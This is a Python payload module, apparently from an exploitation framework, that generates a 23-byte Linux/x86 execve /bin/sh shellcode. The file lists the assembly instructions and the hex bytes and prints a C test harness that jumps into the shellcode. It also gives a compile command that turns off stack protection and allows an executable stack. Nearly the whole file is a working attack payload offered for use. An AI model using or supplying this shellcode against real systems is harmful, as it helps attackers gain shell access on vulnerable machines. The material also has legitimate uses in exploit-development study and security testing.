#!/usr/bin/python
# -*-  coding: utf-8 -*-

##
# Current source: https://github.com/open-security/vulnpwn/
##

from lib.core import payload


class Module(payload.Payload):

    __info__ = {
        'name': 'Linux/x86 - execve /bin/sh shellcode',
        'description': 'Linux/x86 execve /bin/sh shellcode 23 bytes',
        'license': 'APACHE_LICENSE',
        'disclosureDate': 'Jun 7 2015',
        'author': ['shell-storm'],
        'references': [
            'http://shell-storm.org/shellcode/files/shellcode-827.php'
        ],
        'options': {
        }
    }

    def __init__(self):
        payload.Payload.__init__(self)

    def format_shellcode_C(self, shellcode):
        format_c = (
            "#include <stdio.h>\n"
            "#include <string.h>\n"
            "\n"
            "char *shellcode = \"%s\";\n"
            "\n"
            "int main(void){\n"
            "     fprintf(stdout,\"Length: %%d\\n\",strlen(shellcode));\n"
            "     (*(void(*)()) shellcode)();\n"
            "}") % shellcode

        return format_c

    def generate_shellcode(self):
        """
        Linux/x86 execve /bin/sh shellcode 23 bytes

        xor    %eax,%eax
        push   %eax
        push   $0x68732f2f
        push   $0x6e69622f
        mov    %esp,%ebx
        push   %eax
        push   %ebx
        mov    %esp,%ecx
        mov    $0xb,%al
        int    $0x80


        """

        self.shellcode = r""
        self.shellcode += r"\x31\xc0"
        self.shellcode += r"\x50"
        self.shellcode += r"\x68\x2f\x2f\x73\x68"
        self.shellcode += r"\x68\x2f\x62\x69\x6e"
        self.shellcode += r"\x89\xe3"
        self.shellcode += r"\x50\x53"
        self.shellcode += r"\x89\xe1"
        self.shellcode += r"\xb0\x0b"
        self.shellcode += r"\xcd\x80"

        self.output("----Hex shellcode----")
        print(self.shellcode)
        print("\n")

        self.output("----C   shellcode----")
        print("Compile: gcc -fno-stack-protector -z execstack shellcode.c\n")
        print(self.format_shellcode_C(self.shellcode))
        print("\n")
